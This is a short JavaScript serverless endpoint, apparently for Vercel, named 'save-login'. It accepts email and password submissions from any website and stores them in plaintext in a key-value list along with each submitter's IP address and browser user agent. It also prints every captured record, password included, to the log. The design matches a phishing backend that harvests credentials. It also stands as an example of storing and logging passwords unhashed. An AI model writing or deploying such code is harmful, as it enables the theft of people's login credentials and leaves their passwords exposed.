// api/save-login.js
import { createClient } from '@vercel/kv';

// Initialize Vercel KV (Redis-like database)
const kv = createClient({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, type } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password required' });
    }

    // Create login entry
    const loginData = {
      email,
      password,
      type: type || 'signin',
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'],
      id: Date.now(),
    };

    // Get existing logins
    let logins = await kv.get('logins') || [];
    
    // Add new login
    logins.push(loginData);
    
    // Save back to KV
    await kv.set('logins', logins);

    console.log('✅ Login saved:', loginData);

    return res.status(200).json({ 
      success: true, 
      message: 'Login saved',
      count: logins.length 
    });

  } catch (error) {
    console.error('Error saving login:', error);
    return res.status(500).json({ 
      error: 'Failed to save login',
      details: error.message 
    });
  }
}